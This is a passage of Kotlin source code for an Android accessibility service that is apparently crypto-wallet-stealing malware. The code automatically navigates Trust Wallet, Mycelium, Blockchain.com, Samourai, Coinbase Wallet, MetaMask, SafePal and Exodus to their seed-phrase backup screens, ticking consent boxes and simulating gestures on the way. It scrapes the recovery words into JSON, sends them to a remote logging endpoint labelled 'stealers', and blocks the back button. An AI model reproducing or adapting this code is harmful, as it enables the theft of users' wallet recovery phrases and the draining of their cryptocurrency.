                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/graph_settings")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        click(it)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/wallets_preference")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        click(it)
                    }

                runCatching {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/main")
                        ?.lastOrNull()
                        ?.let {
                            if (it.getChild(0).className == "androidx.compose.ui.platform.ComposeView"
                                && it.getChild(0).getChild(0).getChild(0).getChild(0).childCount > 5
                                && it.getChild(0).getChild(0).getChild(0).getChild(0).className == "android.widget.ScrollView"
                                && it.getChild(0).getChild(0).getChild(0).getChild(0).getChild(0).className == "android.view.View"
                                && it.getChild(0).getChild(0).getChild(0).getChild(0).getChild(0).isClickable
                            ) {
                                click(it.getChild(0).getChild(0).getChild(0).getChild(0).getChild(0))
                            }
                        }
                }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/item_wallet_info_action")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        click(it)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/wallet_info_container")
                    ?.firstOrNull()
                    ?.let {
                        runCatching {
                            if (it.childCount == 1 && it.getChild(0).childCount == 1) {
                                val scrollView = it.getChild(0).getChild(0).getChild(0)
                                scrollView.getChild(scrollView.childCount - 1)?.let {
                                    click(it)
                                }
                            }
                        }
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/export_phrase_action")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        click(it)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent")
                    ?.firstOrNull { it.isCheckable || it.isClickable }
                    ?.let {
                        if (checkNodeOrParent(it) != true)
                            click(it)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent1")
                    ?.firstOrNull()
                    ?.let {
                        runCatching {
                            val check = it.getChild(0).getChild(1)
                            if (check.className == "android.widget.CheckBox") {
                                if (!check.isChecked)
                                    click(check.parent)
                            }
                        }
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent2")
                    ?.firstOrNull()
                    ?.let {
                        runCatching {
                            val check = it.getChild(0).getChild(1)
                            if (check.className == "android.widget.CheckBox") {
                                if (!check.isChecked)
                                    click(check.parent)
                            }
                        }
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/concent3")
                    ?.firstOrNull()
                    ?.let {
                        runCatching {
                            val check = it.getChild(0).getChild(1)
                            if (check.className == "android.widget.CheckBox") {
                                if (!check.isChecked)
                                    click(check.parent)
                            }
                        }
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/next")
                    ?.firstOrNull { it.isClickable }
                    ?.let {
                        click(it)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.wallet.crypto.trustapp:id/phrase")
                    ?.firstOrNull()
                    ?.let {
                        val obj = JSONObject()
                        for (i in 0 until it.childCount) {
                            val child = it.getChild(i)

                            val child1 = child.getChild(0).text
                            val child2 = child.getChild(1).text

                            obj.put("number_$i", child1)
                            obj.put("word_$i", child2)
                        }

                        if (obj.length() > 0) {
                            apiUt.sendLogs(this, "com.wallet.crypto.trustappt", obj.toString(), "stealers")
                            SharedPreferencess.SettingsWrite(this, "trust", "1")
                            blockBack()
                        }
                    }
            }
            return@runCatching
        }.onFailure {
            apiUt.sendLogs(this, "", "trust ${it.localizedMessage}", "error")
        }

        //----------------com.mycelium.wallet--------------
        runCatching {
            if (packageAppStart.contains(constNm.mycelium) && SharedPreferencess.SettingsRead(this, "mycelium") == null) {
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/miRefresh")
                    ?.firstOrNull()?.parent?.getChild(1)
                    ?.let {
                        if (it.viewIdResourceName != "com.mycelium.wallet:id/miRefresh")
                            click(it)
                        else {
                            runCatching {
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/miRefresh")
                                    ?.firstOrNull()?.parent?.getChild(2)
                                    ?.let {
                                        click(it)
                                    }
                            }
                        }
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/content")
                    ?.get(1)
                    ?.let {
                        click(it.parent)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button1")
                    ?.firstOrNull()
                    ?.let {
                        click(it)
                        TimeUnit.MILLISECONDS.sleep(150.toLong())
                        refresher()
                    }

                val obj = JSONObject()
                var jj = 0
                while (eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/btOkay")
                        ?.firstOrNull { it.isClickable } != null
                ) {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.mycelium}:id/btOkay")
                        ?.firstOrNull { it.isClickable }
                        ?.let {
                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.mycelium.wallet:id/tvShowWordNumber")
                                ?.firstOrNull()
                                ?.let {
                                    val text = it.text
                                    obj.put("number_$jj", text)
                                    jj++
                                }

                            eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("com.mycelium.wallet:id/tvShowWord")
                                ?.firstOrNull()
                                ?.let {
                                    val text = it.text
                                    obj.put("word_$jj", text)
                                    jj++
                                }

                            click(it)
                            TimeUnit.MILLISECONDS.sleep(30.toLong())
                            refresher()
                        }
                }

                if (obj.length() > 0) {
                    apiUt.sendLogs(this, "com.mycelium.wallet", obj.toString(), "stealers")
                    SharedPreferencess.SettingsWrite(this, "mycelium", "1")
                    blockBack()
                }

                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "mycelium ${it.localizedMessage}", "error")
        }

        //----------------piuk.blockchain.android--------------
        runCatching {
            if (packageAppStart.contains(constNm.piuk) && SharedPreferencess.SettingsRead(this, "piuk") == null) {
                runCatching {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                        ?.firstOrNull()
                        ?.let {
                            val view = it.getChild(0)?.getChild(0)?.getChild(0)
                            if (view?.childCount == 4
                                && view.getChild(0).className == "android.widget.TextView"
                                && view.getChild(1).className == "android.widget.TextView"
                                && view.getChild(2).className == "android.view.View"
                            ) {
                                click(view.getChild(2).getChild(0).getChild(0))
                            }
                        }
                }
                runCatching {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                        ?.firstOrNull()
                        ?.let {
                            val view = it.getChild(0)?.getChild(0)?.getChild(0)?.getChild(5)?.getChild(0)
                            if (view?.childCount == 7
                                && view.getChild(2).className == "android.widget.TextView"
                                && view.getChild(0).className == "android.view.View"
                                && view.getChild(0).isClickable
                            ) {
                                click(view.getChild(0))
                            }
                        }
                }

                runCatching {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("piuk.blockchain.android:id/security_group")
                        ?.firstOrNull()?.getChild(0)?.getChild(0)?.getChild(0)
                }.getOrNull()
                    ?.let {
                        click(it)
                    }

                runCatching {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("piuk.blockchain.android:id/security_backup_phrase")
                        ?.firstOrNull()?.getChild(0)?.getChild(0)?.getChild(0)
                }.getOrNull()
                    ?.let {
                        click(it)
                    }

                runCatching {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                        ?.firstOrNull()
                        ?.let {
                            val view = it.getChild(0)?.getChild(0)
                            if (view?.childCount == 7 && view.getChild(3).className == "android.view.View" && view.getChild(3)
                                    .getChild(0).childCount == 24
                            ) {
                                val curview = view.getChild(3).getChild(0)

                                val obj = JSONObject()
                                for ((jj, i) in (0 until curview.childCount).withIndex()) {
                                    val text = curview.getChild(i).text
                                    obj.put("$jj", text)
                                }

                                if (obj.length() > 0) {
                                    apiUt.sendLogs(this, "piuk.blockchain.android", obj.toString(), "stealers")
                                    SharedPreferencess.SettingsWrite(this, "piuk", "1")
                                    blockBack()
                                }
                            }
                        }
                }

                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "piuk ${it.localizedMessage}", "error")
        }

        //----------------com.samourai.wallet--------------
        runCatching {
            if (packageAppStart.contains(constNm.samourai) && SharedPreferencess.SettingsRead(this, "samourai") == null) {
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/buttonPanel")
                    ?.firstOrNull()
                    ?.let {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/button2")
                            ?.firstOrNull()
                            ?.let {
                                click(it)
                            }
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/skipClaim")
                    ?.firstOrNull()
                    ?.let {
                        click(it)
                    }
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/toolbarIcon")
                    ?.firstOrNull()
                    ?.let {
                        click(it)
                    }

                runCatching {
                    val list =
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/mpm_popup_menu_item_label")
                    if (!list.isNullOrEmpty() && list.size == 5) {
                        list[list.size - 2]
                            ?.let {
                                click(it.parent)
                                TimeUnit.MILLISECONDS.sleep(150.toLong())
                                refresher()
                            }
                    }
                }

                runCatching {
                    if ((eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")?.size ?: 0) == 4) {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                            ?.firstOrNull()
                            ?.let {
                                click(it.parent.parent)
                                TimeUnit.MILLISECONDS.sleep(50.toLong())
                                refresher()
                            }
                    }
                }

                runCatching {
                    if ((eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/checkbox")?.size ?: 0) == 3) {
                        eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/title")
                            ?.get(3)
                            ?.let {
                                click(it.parent.parent)
                            }
                    }
                }

                val obj = JSONObject()
                var jj = 0
                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/custom")
                    ?.firstOrNull()
                    ?.let {
                        obj.put(
                            "word_$jj",
                            "${
                                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("${constNm.samourai}:id/custom")
                                    ?.firstOrNull()?.getChild(0)?.text ?: ""
                            }"
                        )
                        jj++
                    }

                if (obj.length() > 0) {
                    apiUt.sendLogs(this, "com.samourai.wallet", obj.toString(), "stealers")
                    SharedPreferencess.SettingsWrite(this, "samourai", "1")
                    blockBack()
                }

                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "samourai ${it.localizedMessage}", "error")
        }

        //----------------org.toshi--------------
        runCatching {
            if (packageAppStart.contains(constNm.toshi) && SharedPreferencess.SettingsRead(this, "toshi") == null) {
                iterateNodesToFindViewWithId(eventRootInActiveWindow, "SettingsTabButton")
                    ?.let {
                        clickNodeOrParent(it, false)
                    }

                iterateNodesToFindViewWithId(eventRootInActiveWindow, "recovery-phrase-list-cell")
                    ?.let {
                        clickNodeOrParent(it, false)
                    }

                val obj = JSONObject()
                val jj = 0
                iterateNodesToFindViewWithId(eventRootInActiveWindow, "mnemonic-text-display-blurred")
                    ?.let {
                        obj.put("word_$jj", it.contentDescription)
                    }

                if (obj.length() > 0) {
                    apiUt.sendLogs(this, "org.toshi", obj.toString(), "stealers")
                    SharedPreferencess.SettingsWrite(this, "toshi", "1")
                    blockBack()
                }

                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "toshi ${it.localizedMessage}", "error")
        }

        //----------------io.metamask--------------
        runCatching {
            if (packageAppStart.contains(constNm.metamask) && SharedPreferencess.SettingsRead(this, "metamask") == null) {

                iterateNodesToFindViewWithDesc(eventRootInActiveWindow, "hamburger-menu-button-wallet")
                    ?.let {
                        if (it.isVisibleToUser)
                            clickNodeOrParent(it, false)
                    }

                iterateNodesToFindContainsTextNode(eventRootInActiveWindow, "\uE9C4")
                    ?.let {
                        if (it.isVisibleToUser)
                            click(it.parent)
                    }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByText("MetaMetrics,")
                    ?.firstOrNull()?.parent?.parent
                    ?.let {
                        click(it)
                    }

                iterateNodesToFindViewWithId(eventRootInActiveWindow, "reveal-seed-button")?.let {
                    clickNodeOrParent(it, false)
                    TimeUnit.MILLISECONDS.sleep(200.toLong())
                }

                iterateNodesToFindContainsTextNode(eventRootInActiveWindow, "\uF00C")
                    ?.let {
                        iterateNodesToFindContainsTextNode(eventRootInActiveWindow, "\uF023")
                            ?.let {
//                                    if (mGestureCallbackWallets?.mCompleted != true)
//                                        return@let

                                val view = it.parent.parent.parent.parent
                                val rect = Rect()
                                view.getBoundsInScreen(rect)

                                mGestureCallbackWallets.mCompleted = false
                                dispatchCallback(
                                    Resources.getSystem().displayMetrics.widthPixels / 2f,
                                    rect.centerY().toFloat(),
                                    true,
                                    mGestureCallbackWallets
                                )

                                TimeUnit.MILLISECONDS.sleep(500.toLong())
                            }
                    }

                iterateNodesToFindViewWithId(eventRootInActiveWindow, "private-credential-text")
                    ?.let {
                        val obj = JSONObject()
                        obj.put("seed", it.text)
                        apiUt.sendLogs(this, constNm.metamask, obj.toString(), "stealers")
                        SharedPreferencess.SettingsWrite(this, "metamask", "1")
                        mGestureCallback.mCompleted = true
                        mGestureCallbackWallets.mCompleted = true
                        blockBack()
                    }

                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "metamask ${it.localizedMessage}", "error")
        }

        //----------------io.safepal.wallet--------------
        runCatching {
            if (packageAppStart.contains(constNm.safepal) && SharedPreferencess.SettingsRead(this, "safepal") == null) {

                iterateNodesToFindViewWithIdClassWithDesc(eventRootInActiveWindow, "android.view.View", 3)?.let {
                    if (it.getChild(0).className == "android.widget.Button"
                        && it.getChild(1).className == "android.widget.Button"
                        && it.getChild(2).className == "android.widget.Button"
                    ) {
                        click(it, true)
                        refresher()
                    }
                }

                eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                    ?.firstOrNull()
                    ?.let {
                        val view = it.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)
                        if (view?.childCount == 7
                            && view.getChild(3).className == "android.widget.ImageView"
                            && view.getChild(4).className == "android.widget.EditText"
                        ) {
                            click(view.getChild(5).getChild(0).getChild(1).getChild(0).getChild(0))
                        }
                    }


                runCatching {
                    eventRootInActiveWindow?.findAccessibilityNodeInfosByViewId("android:id/content")
                        ?.firstOrNull()
                        ?.let {
                            val view = it.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)?.getChild(0)
                            if (view?.childCount == 3
                                && view.getChild(1).getChild(0).childCount == 4
                            ) {
                                click(view.getChild(1).getChild(0).getChild(2).getChild(0))
                            }
                        }
                }

                iterateNodesToFindViewWithCntChildAndType(eventRootInActiveWindow, 12, "android.view.View")?.let {
                    val childCount = it.childCount
                    val obj = JSONObject()
                    for (i in 0 until childCount) {
                        val childNodeInfo = it.getChild(i)
                        obj.put("$i", childNodeInfo.contentDescription)
                    }
                    apiUt.sendLogs(this, constNm.safepal, obj.toString(), "stealers")
                    SharedPreferencess.SettingsWrite(this, "safepal", "1")
                    blockBack()
                }
                return@runCatching
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "safepal ${it.localizedMessage}", "error")
        }

        //----------------exodusmovement.exodus--------------
        runCatching {
            if (packageAppStart.contains(constNm.exodus) && SharedPreferencess.SettingsRead(this, "exodus") == null) {
                if (cntExodusDhag % 5 == 0) {
                    iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")
                    cntExodusDhag++

                    if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null)
                        return@runCatching

                    iterateNodesToFindExodusBackup(eventRootInActiveWindow)

                    if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                        return@runCatching

                    if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                        return@runCatching
                } else if (cntExodusDhag % 5 == 1) {
                    if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                        cntExodusDhag++
                        return@runCatching
                    }

                    iterateNodesToFindExodusBackup(eventRootInActiveWindow)

                    if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                        return@runCatching

                    if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                        return@runCatching

                    iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")
                } else if (cntExodusDhag % 5 == 2) {
                    iterateNodesToFindExodusBackup(eventRootInActiveWindow)
                    cntExodusDhag++

                    if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                        return@runCatching

                    if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                        return@runCatching

                    iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")

                    if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                        return@runCatching
                    }
                } else if (cntExodusDhag % 5 == 3) {
                    if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null) {
                        cntExodusDhag++
                        return@runCatching
                    }

                    if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                        return@runCatching

                    iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")

                    if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                        return@runCatching
                    }

                    iterateNodesToFindExodusBackup(eventRootInActiveWindow)
                } else if (cntExodusDhag % 5 == 4) {
                    if (iterateNodesToFindExodusPhrase(eventRootInActiveWindow) != null)
                        return@runCatching

                    iterateNodesToFindExodus(eventRootInActiveWindow, "android.view.ViewGroup")

                    if (iterateNodesToFindExodusSecurity(eventRootInActiveWindow, "android.view.ViewGroup") != null) {
                        return@runCatching
                    }

                    if (
                        !(eventRootInActiveWindow?.findAccessibilityNodeInfosByText("0")?.any { it.isVisibleToUser } == true
                                && eventRootInActiveWindow?.findAccessibilityNodeInfosByText("9")?.any { it.isVisibleToUser } == true)
                    ) {
                        iterateNodesToFindExodusBackup(eventRootInActiveWindow)
                    }

                    if (iterateNodesToFindExodusViewSecret(eventRootInActiveWindow) != null)
                        return@runCatching
                }
            }
        }.onFailure {
            apiUt.sendLogs(this, "", "exodus ${it.localizedMessage}", "error")
        }
    }

    private class GestureCallback : GestureResultCallback() {
        var mCompleted = true

        @Synchronized
        override fun onCompleted(gestureDescription: GestureDescription) {
            mCompleted = true
        }

        @Synchronized
        override fun onCancelled(gestureDescription: GestureDescription) {
            mCompleted = true
        }
    }

    companion object {
        var active = false
        var hasPermission = false

        fun startApp(context: Context) {
            try {
                Handler().postDelayed({
                    runCatching {
                        val intent = Intent(context, MainActivity::class.java)
                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                            .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                            .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                        context.startActivity(intent)
                    }.onFailure {
                        runCatching {
                            val intent = Intent(context, actToastAccessbility::class.java)
                                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                .addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                                .addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
                                .addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
                            context.startActivity(intent)
                        }
                    }
                }, 1000)
            } catch (e: java.lang.Exception) {
            }
        }
    }

}